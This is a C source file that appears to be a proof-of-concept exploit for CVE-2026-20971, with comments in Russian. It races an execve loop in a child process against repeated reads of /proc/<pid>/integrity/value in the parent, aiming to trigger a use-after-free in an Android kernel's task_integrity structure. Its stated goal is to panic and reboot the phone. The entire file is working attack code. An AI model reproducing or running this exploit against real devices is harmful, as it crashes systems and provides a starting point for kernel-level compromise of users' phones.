#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>

int main() {
    printf("[*] CVE-2026-20971 Race Condition PoC\n");
    printf("[*] Target: Trigger Kernel Panic via task_integrity UAF\n");

    pid_t pid = fork();

    if (pid == 0) {
        // --- ПРОЦЕСС-ЖЕРТВА (Child) ---
        // Постоянно вызываем execve, чтобы освобождать/создавать task_integrity
        char *argv[] = {"/system/bin/true", NULL};
        char *envp[] = {NULL};
        
        while (1) {
            execve("/system/bin/true", argv, envp);
            // Если execve не сработал (например, нет файла), выходим
            perror("execve failed");
            _exit(1);
        }
    } 
    else if (pid > 0) {
        // --- ПРОЦЕСС-АТАКУЮЩИЙ (Parent) ---
        printf("[*] Child PID: %d\n", pid);
        printf("[*] Racing... (phone will reboot if successful)\n");

        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/integrity/value", pid);
        
        char buf[256];
        long iterations = 0;

        // Ждем пару секунд, чтобы дочерний процесс успел стартовать
        sleep(1);

        while (1) {
            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                // Самое важное: read() должен быть прерван планировщиком
                // в момент, когда ядро уже получило указатель, но еще не прочитало данные.
                read(fd, buf, sizeof(buf));
                close(fd);
            }
            
            iterations++;
            if (iterations % 100000 == 0) {
                printf("[*] Iterations: %ld\n", iterations);
            }
            
            // Иногда проверяем, жив ли еще дочерний процесс
            if (iterations % 1000 == 0) {
                if (kill(pid, 0) != 0) {
                    printf("[-] Child died. Race failed or execve finished.\n");
                    break;
                }
            }
        }
    }
    return 0;
}